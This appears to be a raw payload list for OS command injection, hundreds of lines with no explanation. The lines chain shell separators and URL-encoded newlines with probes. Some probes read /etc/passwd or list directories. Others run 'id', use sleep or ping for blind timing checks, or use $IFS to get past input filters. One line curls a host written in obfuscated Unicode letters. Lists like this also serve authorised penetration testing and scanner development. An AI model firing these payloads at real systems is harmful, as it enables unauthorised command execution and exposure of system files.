$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
$(`cat /etc/passwd`)
$(`dir`)
$(echo SYCGSY > SYCGSY.txt)
'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
"%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
&&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
'%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
;%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
|%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
||%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
"%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
&&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
'%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
;%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
|%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
||%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
"%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
&&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
'%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
;%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
|%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
||%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
"%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
&&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
'%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
;%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
|%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
||%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
"%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
&&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
'%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
;%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
|%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
||%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
"%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
&&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
'%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
;%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
|%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
||%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
%0Aid
%0a id %0a
%0Aid%0A
%0a ping -i 30 127.0.0.1 %0a
"%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
'%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
"%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
'%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
"%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
'%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
"%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
'%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
"%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
'%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
"%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
'%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
"%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi "
%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
'%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
"%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
'%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
%0A/usr/bin/id
%0A/usr/bin/id%0A
%20{${sleep(3)}}
"| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
'| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
"| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
'| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
"| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
'| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
"| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
'| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
"| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
'| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
"| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
'| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
"| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
'| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
"| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
'| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
a);id
a);id;
a);id|
a)|id
a)|id;
a;id
a;id;
a;id|
a|id
a|id|
a;id\n
a);/usr/bin/id
a);/usr/bin/id;
a);/usr/bin/id|
a)|/usr/bin/id
a)|/usr/bin/id;
a;/usr/bin/id
a;/usr/bin/id;
a;/usr/bin/id|
a|/usr/bin/id
|/bin/ls -al
cat /etc/hosts
cat /etc/passwd
`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`
& dir
&& dir
&&dir
; dir
| dir
& dir C:\
&& dir C:\
; dir C:\
| dir C:\
dir C:\
& dir C:\Documents and Settings\*
&& dir C:\Documents and Settings\*
; dir C:\Documents and Settings\*
| dir C:\Documents and Settings\*
dir C:\Documents and Settings\*
& dir C:\Users
&& dir C:\Users
; dir C:\Users
| dir C:\Users
dir C:\Users
"&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
";echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
';echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
;echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
";echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
";echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
';echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
';echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
;echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
;echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
";echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
';echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
;echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
";echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
';echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
;echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
";echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
';echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
;echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
";echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
';echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
;echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
";echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
';echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
;echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
"&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
";echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
"||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
"|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
"echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
';echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
;echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
echo $(rm SYCGSY.txt > SYCGSY.txt)
"&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
";echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
';echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
;echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
"&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
";echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
";echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
"||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
"|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
"echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
